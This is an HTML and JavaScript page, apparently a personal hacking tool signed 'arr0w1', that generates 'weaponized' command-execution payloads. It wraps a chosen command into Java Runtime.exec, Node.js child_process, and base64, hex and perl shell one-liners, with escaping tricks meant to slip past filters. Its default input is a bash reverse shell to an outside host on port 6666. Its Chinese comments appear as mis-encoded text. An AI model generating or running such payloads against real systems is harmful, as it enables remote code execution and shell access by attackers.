<html>

<head>
    <meta charset="utf-8">
    <title>exec</title>
    <link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
</head>

<body>

    <!-- payloads template -->

    <textarea id="data0"
        hidden="true">arr0w1_cmd_origin</textarea>

    <textarea id="data1" hidden="true">
1âƒ£ï¸ å‚æ•°ç±»å‹ String[]
java.lang.Runtime.getRuntime().execâ€‹(String[] cmdarray)    
Executes the specified command and arguments in a separate process.

ä¾‹
java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","echo '123' > ~/Downloads/111.txt"});

ğŸ”¥å®é™…payload - for Linux/macOS ã€æˆåŠŸç‡å¾ˆé«˜ã€‘
java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_origin"});
</textarea>

    <textarea id="data2" hidden="true">
2âƒ£ï¸ å‚æ•°ç±»å‹ String
å‚æ•°ç±»å‹: å­—ç¬¦ä¸²
å¦‚ Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");

ğŸ”¥å®é™…payloadã€æˆåŠŸç‡å¾ˆé«˜ã€‘ æ”¯æŒLinux ä¸æ”¯æŒmacOS
/bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash


ğŸ”¥å®é™…payload ã€æˆåŠŸç‡ä½ã€‘ å¦‚æœå‘½ä»¤å­—ç¬¦ä¸² åŒ…å«äº† shellä¸‹çš„ç‰¹æ®Šå­—ç¬¦ < > { } | & ; åˆ™å‘½ä»¤å¯èƒ½æ‰§è¡Œå¤±è´¥.
/bin/bash -c $@|bash 0 arr0w1_cmd_origin
/bin/bash -c $*|bash 0 arr0w1_cmd_origin
</textarea>

    <textarea id="data3" hidden="true">
3âƒ£ï¸ base64ç¼–ç  - ä½¿ç”¨base64å‘½ä»¤
æ”¯æŒLinux ä¸æ”¯æŒmacOS
ğŸ”¥å®é™…payload
{echo,arr0w1_base64}|{base64,-d}|bash


4âƒ£ï¸ base64ç¼–ç  - ä½¿ç”¨perlä¸­çš„base64è¯­å¥
æ”¯æŒLinux/macOS
ğŸ”¥å®é™…payload
perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'

5âƒ£ï¸ hexç¼–ç 
æ”¯æŒLinux/macOS
å¦‚æœå‘½ä»¤å­—ç¬¦ä¸² åŒ…å«äº† shellä¸‹çš„ç‰¹æ®Šå­—ç¬¦ < > { } | & ; è‡ªåŠ¨ä¸å¯¹å®ƒä»¬åšhexç¼–ç , ä½¿å‘½ä»¤æ‰§è¡ŒæˆåŠŸ.
ğŸ”¥å®é™…payload
`echo -e "ascii_2_Hex_without_black_chars_flag"`
</textarea>

    <textarea id="data4" hidden="true">
å¦‚
require('child_process').exec('echo \'asd\' > ~/Downloads/11111.txt');//
require('\x63hild_process').exec('/System/Applications/Calculator.app/Contents/MacOS/Cal\u0063ulator')

ascii to Hex
c        \x63

UTF-16 to Hex
c        \u0063

ğŸ”¥å®é™…payload
require('child_process').exec('arr0w1_cmd_origin');//

ğŸ”¥å®é™…payload (unicode)
require('\x63hild_process').exec('arr0w1_cmd_ascii2hex');//

ğŸ”¥å®é™…payload (base64)
require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString('utf-8'));//

</textarea>

    <textarea id="data5" hidden="true">
</textarea>

    <textarea id="data6" hidden="true">
</textarea>

<!-- ----------------- -->

    <main role="main">
        <section class="jumbotron text-center g-light">
            <div class="container">
                <h1>exec</h1>
                <p class="lead text-muted">Generate weaponized Command Execution payloads.</p>
            </div>
            <br>

            <p class="font-weight-bold">The command you want to execute:</p>
            <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1" oninput="func_oninput()"
                class="form-control text-white bg-dark" autofocus
                onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />

            <br>

            <hr> <!-- ---------- -->
            
            <p class="font-weight-bold" style="display: none;">åŸå§‹å‘½ä»¤</p>
            
            <textarea id="payload0" class="form-control" style="display: none; rows="1"></textarea>

            <br>
            <br>
            1 Java
            <p class="font-weight-bold">java.lang.Runtime.getRuntime().execâ€‹(ä»¥ä¸‹å†…å®¹); // å‚æ•°ç±»å‹ String[]</p>
            <textarea id="payload1" class="form-control" rows="3"></textarea>

            <br>
            <br>
            2 Java
            <p class="font-weight-bold">java.lang.Runtime.getRuntime().exec("ä»¥ä¸‹å†…å®¹"); // å‚æ•°ç±»å‹ String </p>
            <textarea id="payload2" class="form-control" rows="3"></textarea>

            <br>
            <br>
            3 shell
            <p class="font-weight-bold">Encoding</p>
            <textarea id="payload3" class="form-control" rows="3"></textarea>

            <br>
            <br>
            4 node.js
            <p class="font-weight-bold"> exec </p>
            <textarea id="payload4" class="form-control" rows="3"></textarea>

            <br>
            <br>
            5
            <p class="font-weight-bold">temp </p>
            <textarea id="payload5" class="form-control" rows="3"></textarea>

            <br>
            <br>
            6
            <p class="font-weight-bold">temp </p>
            <textarea id="payload6" class="form-control" rows="3"></textarea>

        </section>
    </main>

    <footer class="text-muted">
        <div class="container">
            <p class="float-right">
                <a href="#">Back to TOP</a>
            </p>
            <p>arr0w1</p>
        </div>
    </footer>

</body>


<script>

    // -----

    // get elements - hiddened
    element_data0 = document.getElementById("data0");
    element_data1 = document.getElementById("data1");
    element_data2 = document.getElementById("data2");
    element_data3 = document.getElementById("data3");
    element_data4 = document.getElementById("data4");
    element_data5 = document.getElementById("data5");
    element_data6 = document.getElementById("data6");

    // get datas
    var data0 = element_data0.value;
    var data1 = element_data1.value;
    var data2 = element_data2.value;
    var data3 = element_data3.value;
    var data4 = element_data4.value;
    var data5 = element_data5.value;
    var data6 = element_data6.value;

    // -----

    //textareaå¢é«˜ éšå†…å®¹è‡ªåŠ¨å¢åŠ textareaçš„é«˜åº¦
    function auto_grow(element) {
        element.style.height = "5px";
        element.style.height = (element.scrollHeight) + "px";
    }

    // -----


function ascii_2_Hex(str) {
            var re = /[\u4E00-\u9FA5]/;
            var ar = [];
            for (var i = 0; i < str.length; i++) {
                var a = '';
                if (re.test(str.charAt(i))) { // ä¸­æ–‡
                    a = encodeURI(str.charAt(i)).replace(/%/g, '');
                } else {
                    a = "\\x" + str.charCodeAt(i).toString(16);
                }
                ar.push(a);
            }
            str = ar.join("");
            return str;
        }

function ascii_2_Hex_without_black_chars(str) {
var regex_black_chars = /([<>{}|&;])/g;
var str_array = str.split(regex_black_chars);
// æ’é™¤ black_chars å¦‚æœå‘½ä»¤é‡Œæœ‰è¿™äº›å­—ç¬¦,hexç¼–ç åçš„å‘½ä»¤æ— æ³•æ‰§è¡Œ!

var allstr = "";
str_array.forEach (
    function (one) {
        if (one.match(regex_black_chars)){
            one = one.replace(regex_black_chars,"\"`$& `echo -e \"");
        }else{
            one = ascii_2_Hex(one);
        }
        allstr += one;
    }
);
return allstr;
}

    // ç”Ÿæˆä¸å¸¦=çš„base64å­—ç¬¦ä¸²
    function func_wise_btoa(str1) {
        //åŸç†:åœ¨åŸå§‹jsè¯­å¥ååŠ ç©ºæ ¼ ç›´åˆ°ç”Ÿæˆçš„base64å­—ç¬¦ä¸²æ²¡æœ‰ç©ºæ ¼
        while (1) {
            if (btoa(str1).indexOf("=") == -1) {//  ç­‰å·ä¸å­˜åœ¨
                return btoa(str1);
            } else {
                str1 = str1 + " ";
            }

        }
    }

    var func_oninput = function () {

        var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value );

        var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);

        // -------
        // è®¾ç½®/æ›¿æ¢ textareaçš„å†…å®¹
        document.getElementById("payload0").value = cmd_origin;

        // å…¨éƒ¨åŒ¹é… /g
        document.getElementById("payload1").value = data1.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);

        document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);

        document.getElementById("payload3").value = data3.replace(/ascii_2_Hex_without_black_chars_flag/g,ascii_2_Hex_without_black_chars(cmd_origin)).replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );

        document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );


        document.getElementById("payload5").value = data5.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);

        document.getElementById("payload6").value = data6.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);

        auto_grow(document.getElementById("payload0"));
        auto_grow(document.getElementById("payload1"));
        auto_grow(document.getElementById("payload2"));
        auto_grow(document.getElementById("payload3"));
        auto_grow(document.getElementById("payload4"));
        auto_grow(document.getElementById("payload5"));
        auto_grow(document.getElementById("payload6"));
    }

    // -----

    func_oninput();
</script>

</html>
